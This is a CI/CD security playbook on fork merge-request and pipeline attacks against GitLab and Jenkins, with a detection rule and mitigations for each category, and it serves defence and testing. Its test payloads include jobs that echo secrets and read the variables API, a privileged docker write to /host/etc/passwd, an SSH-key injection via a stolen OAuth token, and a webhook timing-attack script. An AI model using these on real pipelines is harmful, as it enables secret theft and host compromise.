# CI/CD Security Playbook: Defending Against Pipeline-Based Attacks

**Version:** 1.0
**License:** CC BY-NC-SA 4.0  
**Last Updated:** 16 April 2026

> **⚠️ Disclaimer:** This playbook is for **authorized security testing and educational purposes only**. Do not use these techniques on any system without explicit written permission from the system owner. Unauthorized testing is illegal and violates platform terms of service. The authors assume no liability for misuse.

---

## Table of Contents

- [Quick Reference Matrix](#quick-reference-matrix)
- [Category 1: Fork MR Variable Leakage](#category-1-fork-mr-variable-leakage)
- [Category 2: Runner-Tag Misbinding](#category-2-runner-tag-misbinding)
- [Category 3: Group Variable Inheritance](#category-3-group-variable-inheritance)
- [Category 4: Webhook Signature Flaws](#category-4-webhook-signature-flaws)
- [Category 5: Artifact Poisoning](#category-5-artifact-poisoning)
- [Category 6: Trigger Token Leakage](#category-6-trigger-token-leakage)
- [Category 7: OAuth/SSO Misbinding](#category-7-oauthsso-misbinding)
- [Category 8: Jenkins-Specific Flaws](#category-8-jenkins-specific-flaws)
- [Detection Engineering Rules](#detection-engineering-rules)
- [Appendix A: Severity Scoring Matrix](#appendix-a-severity-scoring-matrix)
- [Appendix B: Report Template](#appendix-b-report-template)
- [Appendix C: Defensive Testing Checklist](#appendix-c-defensive-testing-checklist)
- [Appendix D: References & Sources](#appendix-c-references--sources)

---

## Quick Reference Matrix

| Category | Primary Platforms | Typical Impact | Severity |
|----------|-------------------|----------------|----------|
| Fork MR Variable Leakage | GitLab, GitHub Actions | Secret exposure, lateral movement | Critical |
| Runner-Tag Misbinding | GitLab, GitHub Actions | Privileged code execution | High |
| Group Variable Inheritance | GitLab | Cross-project secret leak | High |
| Webhook Signature Flaws | All | Arbitrary pipeline trigger | Medium-High |
| Artifact Poisoning | GitLab, GitHub Actions | Malicious code deployment | High |
| Trigger Token Leakage | GitLab | Unauthorized pipeline execution | Critical |
| OAuth/SSO Misbinding | GitLab, Jenkins | Privilege escalation | High |
| Jenkins Sandbox Bypass | Jenkins | Remote Code Execution (RCE) | Critical |

---

## Category 1: Fork MR Variable Leakage

### Threat Model

When a merge request (MR) originates from a fork, GitLab can run a pipeline in the **target project's context** (if `only: [merge_requests]` is used). Protected CI/CD variables may be injected into this pipeline. As of GitLab 18.1 (2026), new projects have a setting **"Allow merge request pipelines to access protected variables and runners"** enabled by default, increasing the risk for misconfigured repositories.

**Attack Flow:**
1. Attacker forks a private project.
2. Upstream has `$DEPLOY_KEY` (masked, protected).
3. Attacker creates MR: `fork:main → upstream:main`.
4. Attacker's `.gitlab-ci.yml` contains:
   ```yaml
   leak:
     script: echo "Deploy key: $DEPLOY_KEY"


1. If variable injection is allowed, secret appears in job logs.

Test Payload

```yaml
# In fork's .gitlab-ci.yml
test-leak:
  script:
    - echo "Secret: $PROTECTED_VAR"
    - env | grep -i secret
    - curl -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$CI_PROJECT_ID/variables"
```

Detection Signal

· Log Source: GitLab audit_events / pipeline_events
· Indicators:
  · merge_request_source_project_id != target_project_id
  · protected_variable_injected: true (unexpected)
· Alert Condition: Fork MR pipeline accesses protected variable.

Mitigation

Layer Action
Project Setting Disable "Allow merge request pipelines to access protected variables" for sensitive projects (Projects → Settings → CI/CD → Pipeline Configuration).
Pipeline Definition Avoid only: [merge_requests] for jobs that handle secrets; use rules: with if: $CI_PIPELINE_SOURCE == "merge_request_event" && $CI_MERGE_REQUEST_SOURCE_IS_FORK == "true" to skip secret-dependent jobs.
Variable Protection Use environment-scoped variables instead of project-level protected ones.
Runner Isolation Force fork MR pipelines to use specific runners without access to internal networks.

---

Category 2: Runner-Tag Misbinding

Threat Model

Runners with special tags (e.g., privileged, deploy) should only execute trusted code. If a fork MR pipeline can reference those tags, it may run malicious code on a privileged runner, leading to host compromise.

Test Payload

```yaml
# In fork's .gitlab-ci.yml
job:
  tags:
    - privileged
  script:
    - docker run --privileged alpine sh -c "echo compromised > /host/etc/passwd"
```

Detection Signal

· Log Source: GitLab runner_events
· Indicators:
  · runner_tags contains privileged keywords (privileged, deploy, production)
  · pipeline_source: merge_request_event
  · source_project_is_fork: true

Mitigation

Layer Action
Runner Configuration Set protected: true on runners; they will only pick up jobs from protected branches/tags.
Project Setting Disable "Allow merge request pipelines to access protected runners" (GitLab 18.1+).
Pipeline Control Use tags only in jobs that run on protected branches.

---

Category 3: Group Variable Inheritance

Threat Model

GitLab groups can define CI/CD variables inherited by all subgroups and projects. An attacker with a fork inside a subgroup can attempt to read parent group secrets via API calls or variable expansion in MR pipelines.

Test Payload

```yaml
# In fork MR pipeline
leak-group:
  script:
    - curl -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/$(echo $CI_PROJECT_PATH | cut -d'/' -f1)/variables"
```

Detection Signal

· Log Source: API access logs (api.log) or GitLab audit_events
· Indicators:
  · endpoint: /api/v4/groups/*/variables
  · pipeline_source: merge_request_event
  · source_project_is_fork: true

Mitigation

Layer Action
Variable Placement Store sensitive variables at project level, not group level.
Token Scoping The CI_JOB_TOKEN for fork MRs cannot access parent group variables by default; ensure this is not overridden.
Audit Logging Monitor group variable access from unexpected project contexts.

---

Category 4: Webhook Signature Flaws

Threat Model

GitLab webhooks use HMAC-SHA256 signatures. A receiver with flawed validation (non-constant-time compare, missing signature allowed) can be tricked into accepting forged events. Combined with a fork MR that triggers a legitimate webhook, an attacker can perform timing analysis to recover the secret.

Test Payload (Lab Only)

```python
# Timing attack simulation (authorized lab)
import time, hmac, hashlib, requests

def timing_attack(url, secret_len=20):
    known = ""
    for _ in range(secret_len):
        best_time = 0
        best_byte = 0
        for b in range(256):
            sig = known + chr(b) + "0" * (secret_len - len(known) - 1)
            start = time.perf_counter()
            r = requests.post(url, headers={"X-Gitlab-Signature": f"sha256={sig}"})
            elapsed = time.perf_counter() - start
            if elapsed > best_time:
                best_time = elapsed
                best_byte = b
        known += chr(best_byte)
    return known
```

Detection Signal

· Log Source: Webhook receiver application logs
· Indicators:
  · High rate of requests with invalid signatures from same IP
  · Response time variation >10ms between correct/incorrect signature bytes
  · Requests missing X-Gitlab-Signature header

Mitigation

Layer Action
Code Use constant-time comparison: hmac.compare_digest(received_sig, expected_sig)
Validation Reject requests without signature header; validate event type matches payload.
Network Restrict incoming webhook traffic to GitLab's IP ranges.
GitLab Side Rotate webhook secrets regularly.

---

Category 5: Artifact Poisoning

Threat Model

An MR pipeline from a fork can produce artifacts that are later consumed by a trusted downstream job (e.g., deploy). If the artifact is not validated, malicious code can be deployed to production.

Test Payload

```yaml
# In fork's MR pipeline
build:
  script:
    - echo "malicious payload" > output.txt
  artifacts:
    paths: [output.txt]

# In upstream's .gitlab-ci.yml (target branch)
deploy:
  needs: [build]
  script:
    - cat output.txt  # Should be safe, but may contain poisoned data
```

Detection Signal

· Log Source: Pipeline dependency logs (pipeline_dependencies)
· Indicators:
  · consumer_job.protected: true
  · artifact_source_project.is_fork: true
  · artifact_pipeline.source: merge_request_event

Mitigation

Layer Action
Pipeline Design Only allow needs to consume artifacts from pipelines that ran on the target branch after merge.
Artifact Signing Sign artifacts in trusted build and verify signature before deployment.
Cache Isolation Include $CI_MERGE_REQUEST_SOURCE_BRANCH_SHA in cache keys to prevent poisoning.

---

Category 6: Trigger Token Leakage

Threat Model

GitLab trigger tokens (format: glptt-[a-f0-9]{40}) allow anyone to start pipelines on a project. If a token is exposed in job logs, artifacts, or MR descriptions, an attacker can trigger arbitrary pipelines with variable overrides.

Test Payload

```yaml
# In fork's MR pipeline (attempt leak)
exfil:
  script:
    - echo "Token: $CI_PIPELINE_TRIGGER_TOKEN"  # Should be [MASKED]
    - echo $CI_PIPELINE_TRIGGER_TOKEN | base64   # Encoding bypass test
```

Detection Signal

· Log Source: CI job logs, secret scanning tools
· Indicators:
  · Regex match: glptt-[a-f0-9]{40} in plaintext or encoded form
  · source: merge_request_event and project.is_fork: true

Mitigation

Layer Action
GitLab Default $CI_PIPELINE_TRIGGER_TOKEN is masked by default.
Token Scope Restrict trigger token to specific branches.
Override Protection Disable "Override variables" in trigger settings.
Rotation Rotate tokens every 30 days and after any suspected leak.

---

Category 7: OAuth/SSO Misbinding

Threat Model

Organizations sometimes store user OAuth tokens as CI/CD variables to enable pipeline interactions with external systems. If such a token is available in a fork MR pipeline, an attacker can impersonate the user and perform high‑privilege actions (e.g., add SSH keys, read secrets).

Correction (2026): GitLab never automatically injects user OAuth tokens. This risk exists only when organizations manually configure such variables.

Test Payload

```yaml
# Assuming $OAUTH_TOKEN is a manually set variable
impersonate:
  script:
    - curl -H "Authorization: Bearer $OAUTH_TOKEN" "$CI_API_V4_URL/user/keys" -d '{"title":"attacker","key":"ssh-rsa AAA..."}'
```

Detection Signal

· Log Source: OAuth provider logs (e.g., GitLab API logs)
· Indicators:
  · token_type: personal_access_token (not CI_JOB_TOKEN)
  · pipeline_source: merge_request_event and source_project_is_fork: true

Mitigation

Layer Action
Design Never store user credentials in CI/CD variables. Use project/group access tokens or service accounts.
Scoping Use CI_JOB_TOKEN for internal GitLab API calls (limited scope).
Auditing Regularly review CI/CD variables for sensitive patterns.

---

Category 8: Jenkins-Specific Flaws

Threat Model

Jenkins' scripted pipelines and extensive plugin ecosystem create unique attack vectors:

· Sandbox Bypass: Groovy language features (implicit casts) can escape the Script Security sandbox.
· Script Approval Bypass: Rebuilding an old build may execute an unapproved Jenkinsfile (CVE-2024-52550).
· Plugin Vulnerabilities: Over 1,800 plugins, many with high‑severity issues (XXE, RCE).

Test Payload (Sandbox Bypass Attempt)

```groovy
// Jenkinsfile in a sandboxed pipeline
pipeline {
    agent any
    stages {
        stage('Bypass') {
            steps {
                script {
                    // Implicit cast that may bypass sandbox in old versions
                    def dangerous = { -> Runtime.getRuntime() }
                    def result = dangerous.call()
                    echo "Runtime class accessed: ${result.getClass()}"
                }
            }
        }
    }
}
```

Detection Signal

· Log Source: Jenkins script_security.log, audit trail
· Indicators:
  · Log messages containing "Rejected access to method", "implicit cast", "Sandbox bypass attempt"
  · Multiple attempts from same user/pipeline within short time window
  · New script approvals for SHA‑1 hashes (deprecated)

Mitigation

Vulnerability Primary Fix
Groovy Cast Bypass Update Script Security and Pipeline: Groovy plugins together.
Rebuild Approval Bypass Update Pipeline: Groovy to ≥3991.vd281dd77a_389.
Plugin CVEs Apply monthly security updates; remove unused plugins.
SHA‑1 Collision Update Script Security to ≥1190.vb_6b_5b_6b_9b_8a_4b_0.

---

Detection Engineering Rules

This section provides practical detection rules for SIEM and log analysis. All rules assume log ingestion from CI/CD platforms.

Rule 1: Fork MR Variable Leakage (Splunk)

```spl
index=gitlab audit_events 
  event_type="pipeline_started" 
  merge_request_source_project_id!=target_project_id
  | where protected_variable_injected="true"
  | table _time, user, project, pipeline_id, source_branch
```

Rule 2: Privileged Runner Misuse (SQL)

```sql
SELECT rj.*, p.name, r.token
FROM runner_jobs rj
JOIN projects p ON rj.project_id = p.id
JOIN runners r ON rj.runner_id = r.id
WHERE r.tag_list @> ARRAY['privileged', 'production']
  AND rj.pipeline_source = 'merge_request_event'
  AND rj.source_project_id != rj.target_project_id
  AND rj.created_at > NOW() - INTERVAL '7 days';
```

Rule 3: Group Variable Exfiltration Attempt (Elastic)

```json
{
  "rule_id": "ci-cd-group-var-exfiltration",
  "severity": "high",
  "type": "query",
  "query": "event.category:api AND url.path:/api/v4/groups/*/variables AND user.roles:developer AND pipeline.source:merge_request AND project.is_fork:true"
}
```

Rule 4: Webhook Timing Attack (SQL)

```sql
SELECT client_ip, AVG(response_time) as avg_time, STDDEV(response_time) as stddev_time, COUNT(*) as attempts
FROM webhook_logs
WHERE endpoint = '/webhook/gitlab'
  AND timestamp > NOW() - INTERVAL '1 hour'
GROUP BY client_ip
HAVING attempts > 100 AND stddev_time < 5
ORDER BY attempts DESC;
```

Rule 5: Artifact Poisoning (Splunk)

```spl
index=ci_cd_artifacts 
  (artifact.project_id != consumer.project_id) OR (artifact.pipeline.is_fork=true)
  consumer.job.protected=true
  | stats count by artifact.pipeline_id, consumer.pipeline_id, project
  | where count > 0
```

Rule 6: Trigger Token Exposure (Regex Scan)

```bash
grep -rE 'glptt-[a-f0-9]{40}' /var/log/gitlab/jobs/
```

Rule 7: OAuth Misuse (Elastic)

```json
{
  "rule_id": "oauth-fork-pipeline-abuse",
  "severity": "critical",
  "query": "event.category:oauth AND user.type:human AND pipeline.source:merge_request AND project.is_fork:true AND oauth.scope:(api OR write_repository OR admin)"
}
```

Rule 8: Jenkins Sandbox Bypass Attempt (Sigma)

```yaml
title: Jenkins Script Security Sandbox Bypass Attempt
status: experimental
logsource:
  product: jenkins
  service: script_security
detection:
  selection:
    log_message|contains:
      - "Rejected access to method"
      - "Sandbox bypass attempt"
      - "implicit cast"
  correlation:
      same_user.same_pipeline:
        attempts: "> 5"
        time_window: "5m"
  condition: selection and correlation
  level: high
```

---

Appendix A: Severity Scoring Matrix

Impact / Likelihood Low Medium High
Critical (RCE, full project takeover) High Critical Critical
High (Secret leak, pipeline control) Medium High Critical
Medium (Information disclosure) Low Medium High
Low (Configuration exposure) Informational Low Medium

Aligns with CVSS v3.1 and common bug bounty program criteria.

---

Appendix B: Report Template

Use the following structure when reporting findings to platform security teams or bug bounty programs:

```markdown
### Summary
[One-sentence description of the flaw]

### Affected Components
- Platform: GitLab / GitHub / Jenkins / CircleCI
- Project/Repository: [URL]
- Relevant Configuration: [e.g., protected variables, webhook endpoint]

### Steps to Reproduce
1. [Step-by-step instructions, including YAML snippets]
2. [Use non‑production, authorized environment]

### Expected Behavior
[What a secure implementation should do]

### Actual Behavior
[Observed insecure outcome]

### Impact
[Potential business/security impact]

### Mitigation Recommendation
[Specific configuration change or patch version]

### Supporting Evidence
[Log excerpts, screenshots (redacted), video PoC]
```

---

Appendix C: Defensive Testing Checklist (Full ID-Based)

Use these checklists during authorized penetration tests or internal security assessments.

Category 1: Fork MR Variable Leakage

ID Test Expected Secure Behavior Signal of Flaw
V-01 Fork MR targeting protected branch, job echoes $PROTECTED_VAR Empty output or [MASKED] Variable value appears in plain text
V-02 Fork MR job calls env \| grep -i "secret" No protected variables listed Protected vars visible in environment dump
V-03 Fork MR job uses $CI_JOB_TOKEN to call GET /projects/:id/variables HTTP 403 or empty array Variable names or metadata returned
V-04 Fork MR job uses $CI_JOB_TOKEN to call GET /groups/:id/variables HTTP 403 Group-level variable exposure
V-05 Fork MR job attempts variable interpolation in rules: with binary search (time or error based) No timing difference or error leakage Different behavior between true/false conditions

Category 2: Runner-Tag Misbinding

ID Test Expected Secure Behavior Signal of Flaw
R-01 Fork MR pipeline references protected runner tag (e.g., deploy, privileged) Job stuck in pending or fails with tag error Job runs on protected runner
R-02 Fork MR pipeline references runner tag that exists only in upstream group Runner not assigned Runner assigned from upstream group
R-03 Upstream project has runner with protected flag; fork MR targets protected branch Runner NOT used (needs pipeline from protected ref) Runner executes fork MR job
R-04 Fork MR pipeline attempts to use CI_JOB_TOKEN to trigger child pipeline on protected runner 403 or pipeline creation denied Child pipeline runs with elevated context

Category 3: Group Variable Inheritance

ID Test Expected Secure Behavior Signal of Flaw
G-01 Fork from subgroup, MR to parent group's protected branch, echo parent group variable Empty or masked Parent group variable exposed
G-02 Subgroup-level variable overrides parent; fork MR pipeline accesses variable Override IGNORED in fork MR context Attacker-controlled override takes effect
G-03 Fork MR pipeline references CI_MERGE_REQUEST_TARGET_GROUP_VARIABLES (if exposed) No such variable exists Leaked via environment inspection
G-04 Fork MR pipeline attempts API call to parent group with CI_JOB_TOKEN 403 Token allows cross-group variable read

Category 4: Webhook Signature Flaws

ID Test Expected Secure Behavior Signal of Flaw
W-01 Send webhook POST without X-Gitlab-Signature header HTTP 401/403 Request accepted
W-02 Send webhook with invalid signature; measure response time variation Constant response time regardless of signature correctness Statistically significant timing differences (≥10ms per byte)
W-03 Send valid signature but change X-Gitlab-Event header (e.g., Push Hook instead of Merge Request Hook) Request rejected or event ignored Receiver processes forged event type

Category 5: Artifact Poisoning

ID Test Expected Secure Behavior Signal of Flaw
A-01 Fork MR adds needs: to trusted deploy job Deploy job does NOT run or ignores artifact Deploy job executes using fork's artifact
A-02 Fork MR modifies shared cache, then trusted job uses same cache Trusted job uses isolated cache or fresh build Poisoned cache content appears in trusted job
A-03 Fork MR triggers downstream project with artifact URL variable Downstream project rejects or validates URL source Downstream pipeline consumes malicious artifact
A-04 Merge MR (from fork) but artifact still exists; new pipeline references old artifact ID Artifact inaccessible or pipeline fails Old MR artifact consumed post-merge
A-05 Fork MR creates artifact; maintainer approves MR but doesn't merge; artifact still live Artifact expires quickly (≤1 hour) Artifact persists >1 hour

Category 6: Trigger Token Leakage

ID Test Expected Secure Behavior Signal of Flaw
T-01 Fork MR job echoes $CI_PIPELINE_TRIGGER_TOKEN directly Output is [MASKED] Token appears in plain text
T-02 Fork MR job echoes $CI_PIPELINE_TRIGGER_TOKEN encoded (base64, hex) Output still masked or blocked Encoded token leaks
T-03 Fork MR job writes token to file, uploads as artifact File contents masked or artifact blocked Artifact contains plain token
T-04 Fork MR job uses token to trigger same project pipeline HTTP 403 (fork cannot use token) Pipeline triggers successfully
T-05 Fork MR job attempts to override $DEPLOY_ENV via trigger API Override ignored or restricted Variable override works
T-06 Subgroup fork MR tries to access parent group trigger token Token not present in environment Parent group token accessible

Category 7: OAuth/SSO Misbinding

ID Test Expected Secure Behavior Signal of Flaw
O-01 Fork MR pipeline accesses $OAUTH_TOKEN (manually configured variable) Variable not present or masked Token accessible in fork context
O-02 Pipeline uses $CI_JOB_TOKEN to perform API actions on behalf of triggering user Token scope limited to current project only Token can access resources outside project
O-03 Scheduled pipeline runs; check $CI_JOB_TOKEN scopes Token matches schedule owner's permissions Token has maintainer access to unrelated groups
O-04 Downstream pipeline triggered from MR; check token inheritance Token NOT propagated Downstream pipeline runs with upstream user's token

Category 8: Jenkins-Specific Flaws

ID Test Expected Secure Behavior Signal of Flaw
J-01 Sandboxed pipeline uses implicit Groovy cast (e.g., returning object as different type) Sandbox blocks or intercepts Code executes, bypassing sandbox
J-02 Rebuild previous build whose Jenkinsfile was disapproved Rebuild fails or re-approval required Rebuild succeeds, unapproved code runs
J-03 Configure folder-scoped library override pointing to malicious repo Library runs in sandbox Library executes without sandbox
J-04 Craft XML payload in JDepend plugin (if installed) XML parsing blocks XXE Secret extraction or SSRF
J-05 Trigger CSRF endpoint in Extensible Choice Parameter plugin Request rejected Sandboxed Groovy executes
J-06 Check config.xml for plain text credentials Credentials encrypted or not stored API keys/tokens in plain text

---

Appendix D: References & Sources

Fact Verification Source
GitLab trigger token format: glptt-[a-f0-9]{40} GitGuardian detector database, GitLab MR !195007
Protected variable behavior in GitLab 18.1+ GitLab epic !196304, !198754; Docs: "Merge request pipelines access to protected variables"
Jenkins CVE-2024-52550 (rebuild approval bypass) Jenkins Security Advisory 2024-11-13
GitHub Actions GITHUB_TOKEN fork PR permissions GitHub Docs: "Permissions for the GITHUB_TOKEN" (post‑2023 read‑only default)
CircleCI context precedence CircleCI Docs: "Using Contexts"
Webhook HMAC constant‑time requirement Jenkins SECURITY‑2871, GitLab webhook docs

---
